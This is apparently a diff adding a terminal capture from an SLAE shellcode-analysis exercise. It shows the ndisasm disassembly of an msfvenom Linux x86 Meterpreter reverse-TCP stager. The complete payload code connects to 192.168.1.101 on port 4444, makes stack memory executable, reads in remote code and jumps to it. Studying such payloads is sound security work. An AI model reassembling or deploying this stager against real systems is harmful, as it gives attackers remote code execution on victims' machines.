@@ -1,0 +1,49 @@
+root@kali-OSCP:~/Desktop/SLAE/Assign/Assign5 msfvenom shellcode samples/Met_Rev# ndisasm -u ./linux-x86-met_rev.msf
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx
+00000005  43                inc ebx
+00000006  53                push ebx
+00000007  6A02              push byte +0x2
+00000009  B066              mov al,0x66
+0000000B  89E1              mov ecx,esp
+0000000D  CD80              int 0x80
+0000000F  85C0              test eax,eax
+00000011  7844              js 0x57
+00000013  97                xchg eax,edi
+00000014  5B                pop ebx
+00000015  68C0A80165        push dword 0x6501a8c0
+0000001A  680200115C        push dword 0x5c110002
+0000001F  89E1              mov ecx,esp
+00000021  6A66              push byte +0x66
+00000023  58                pop eax
+00000024  50                push eax
+00000025  51                push ecx
+00000026  57                push edi
+00000027  89E1              mov ecx,esp
+00000029  43                inc ebx
+0000002A  CD80              int 0x80
+0000002C  85C0              test eax,eax
+0000002E  7827              js 0x57
+00000030  B207              mov dl,0x7
+00000032  B900100000        mov ecx,0x1000
+00000037  89E3              mov ebx,esp
+00000039  C1EB0C            shr ebx,byte 0xc
+0000003C  C1E30C            shl ebx,byte 0xc
+0000003F  B07D              mov al,0x7d
+00000041  CD80              int 0x80
+00000043  85C0              test eax,eax
+00000045  7810              js 0x57
+00000047  5B                pop ebx
+00000048  89E1              mov ecx,esp
+0000004A  99                cdq
+0000004B  B60C              mov dh,0xc
+0000004D  B003              mov al,0x3
+0000004F  CD80              int 0x80
+00000051  85C0              test eax,eax
+00000053  7802              js 0x57
+00000055  FFE1              jmp ecx
+00000057  B801000000        mov eax,0x1
+0000005C  BB01000000        mov ebx,0x1
+00000061  CD80              int 0x80
+
